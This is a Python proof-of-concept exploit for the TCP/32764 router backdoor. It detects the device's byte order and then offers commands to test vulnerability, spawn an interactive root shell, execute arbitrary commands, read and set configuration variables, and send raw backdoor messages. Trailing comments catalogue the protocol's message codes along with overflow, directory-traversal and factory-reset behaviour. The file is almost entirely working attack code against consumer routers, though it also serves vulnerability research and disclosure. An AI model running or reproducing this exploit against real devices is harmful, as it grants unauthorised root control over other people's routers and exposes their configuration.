#!/usr/bin/env python
import socket
import struct
import sys
import argparse

parser = argparse.ArgumentParser(description='PoC for the TCP/32764 backdoor.\n'\
	'see https://github.com/elvanderb/TCP-32764 for more details')

parser.add_argument('--ip', type=str, nargs='?', help='routers IP', default='192.168.1.1')
parser.add_argument('--port', type=int, nargs='?', help='port to use', default=32764)
command_group = parser.add_mutually_exclusive_group()
command_group.add_argument('--is_vuln', help='tells you if the router is vulnerable or not (default)', action="store_true")
command_group.add_argument('--shell', help='gives you a root shell on the router', action="store_true")
command_group.add_argument('--execute', type=str, nargs='?', help='run a command and dump straight to stdout', default='')
command_group.add_argument('--print_conf', help='pretty print router\'s configuration', action="store_true")
command_group.add_argument('--get_var', type=str, nargs='?', metavar='var_name', help='get router\'s configuration variable')
command_group.add_argument('--set_var', type=str, nargs='?', metavar='var_name=val', help='set router\'s configuration variable')
command_group.add_argument('--message', type=int, nargs='?', help='message to send', choices=range(1, 14))
parser.add_argument('--payload', type=str, nargs='?', help='message\'s payload', default='')
parser.add_argument('--timeout', type=int, nargs='?', help='connexion timeout in seconds', default=1)

args = parser.parse_args()

def send_message(s, endianness, message, payload=''):
	header = struct.pack(endianness + 'III', 0x53634D4D, message, len(payload)+1)
	s.send(header+payload+"\x00")
	r = s.recv(0xC)

	while len(r) < 0xC:
		tmp = s.recv(0xC - len(r))
		assert len(tmp) != 0
		r += tmp

	sig, ret_val, ret_len = struct.unpack(endianness + 'III', r)
	assert(sig == 0x53634D4D)

	if ret_val != 0:
		return ret_val, "ERROR"

	ret_str = ""
	while len(ret_str) < ret_len:
		tmp = s.recv(ret_len - len(ret_str))
		assert len(tmp) != 0
		ret_str += tmp

	return ret_val, ret_str

# Big endian or little endian ?
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(args.timeout)
try :
	s.connect((args.ip, args.port))
except socket.error as v:
	print("probably not vulnerable (error: {0:s})".format(v))
	sys.exit(0)

s.send("blablablabla")
r = s.recv(0xC)
while len(r) < 0xC:
	tmp = s.recv(0xC - len(r))
	assert len(tmp) != 0
	r += tmp

sig, ret_val, ret_len = struct.unpack('<III', r)
if sig == 0x53634D4D :
	endianness = "<"
elif sig == 0x4D4D6353 :
	endianness = ">"
else :
	print("probably not vulnerable")
	sys.exit(0)
s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(args.timeout)
s.connect((args.ip, args.port))
if args.is_vuln :
	print("{0:s}:{1:d} is vulnerable!".format(args.ip, args.port))
elif args.shell :
	print(send_message(s, endianness, 7, 'echo "welcome, here is a root shell, have fun"')[1])
	while 1 :
		print(send_message(s, endianness, 7, sys.stdin.readline().strip('\n'))[1])
elif len(args.execute) :
	sys.stdout.write(send_message(s, endianness, 7, args.execute)[1])
elif args.print_conf :
	conf = send_message(s, endianness, 1)[1]
	conf = conf.replace("\x00", "\n")
	conf = conf.replace("\x01", "\n\t")
	print(conf)
elif args.get_var is not None :
	response = send_message(s, endianness, 2, args.get_var)[1].rstrip("\x00")
	if len(response) == 0 :
		print("{0:s} is not set".format(args.get_var))
	else :
		print(response)
elif args.set_var is not None :
	r, _ = send_message(s, endianness, 3, args.set_var)
elif args.message is not None :
	r, response = send_message(s, endianness, args.message, args.payload)
	if r != 0 :
		print("Command failed, error code: {0:08X}".format(r))
	elif len(response) != 0 :
		print("Command succeed:")
		print(response.encode("string_escape"))
	else :
		print("Command succeed:")
else :
	print("{0:s}:{1:d} is vulnerable!".format(args.ip, args.port))

s.close()

#commands :
# 1 : get infos
# 2 : get var -> possible overflow
# 3 : set var -> buffer overflow
# 4 : commit nvram (read nvram /dev/mtdblock/3 from /tmp/nvram and check CRC)
# 5 : bridge mode ?
#	wan_mode=bridgedonly
#	wan_encap=0
#	wan_vpi=8
#	wan_vci=81
#	/usr/bin/killall br2684ctl
#	/usr/bin/killall udhcpd
#	/usr/bin/killall -9 atm_monitor
#	/usr/sbin/rc wan stop >/dev/null 2>&1
#	/usr/sbin/atm_monitor&
# 6 : show speed
# 7 : cmd
#	special commands :
#		exit, bye, quit -> quit... (set alive to 0)
#		cd : change directory (a little bit WTF)
# other commands :
#		integer overflow in stdout handling (?) not exploitable but still ...
#		buffer overflow (buffer de 0x10000)
#		 
# 8 : write file (file name in payload, dir : tmp, directory traversa)
# 9 : print version
#10 : print modem router ip (nvram_get(lan_ipaddr))
#11 : resaure default settings (nvram_set(restore_default, 1) / nvram_commit)
#12 : read /dev/mtdblock/0 [-4:-2]
#13 : dump nvram on disk (/tmp/nvram) and commit
